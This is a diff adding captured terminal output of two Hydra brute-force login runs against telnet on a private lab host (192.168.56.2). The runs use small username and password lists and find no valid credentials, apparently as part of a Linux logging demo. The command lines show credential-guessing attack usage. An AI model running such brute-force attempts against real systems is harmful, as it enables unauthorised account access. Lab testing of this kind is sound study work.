@@ -1,0 +1,34 @@
+┌──(yl㉿yl-pc)-[~/proj/LinuxDemo/SdJournalDemo/hydra]
+└─$ hydra -L u.txt -P p.txt -c 1 -V 192.168.56.2 telnet
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[INFO] setting max tasks per host to 1 due to -c option usage
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-16 02:50:39
+[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 1 task per 1 server, overall 1 task, 9 login tries (l:3/p:3), ~9 tries per task
+[DATA] attacking telnet://192.168.56.2:23/
+[ATTEMPT] target 192.168.56.2 - login "root" - pass "a" - 1 of 9 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "root" - pass "333333" - 2 of 9 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "root" - pass "444444" - 3 of 9 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "user1" - pass "a" - 4 of 9 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "user1" - pass "333333" - 5 of 9 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "user1" - pass "444444" - 6 of 9 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "cccc" - pass "a" - 7 of 9 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "cccc" - pass "333333" - 8 of 9 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.2 - login "cccc" - pass "444444" - 9 of 9 [child 0] (0/0)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-16 02:51:15
+                                                                                                                   
+┌──(yl㉿yl-pc)-[~/proj/LinuxDemo/SdJournalDemo/hydra]
+└─$ hydra -l user1 -p a -c 1 -V 192.168.56.2 telnet
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[INFO] setting max tasks per host to 1 due to -c option usage
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-16 03:09:16
+[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking telnet://192.168.56.2:23/
+[ATTEMPT] target 192.168.56.2 - login "user1" - pass "a" - 1 of 1 [child 0] (0/0)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-16 03:09:19
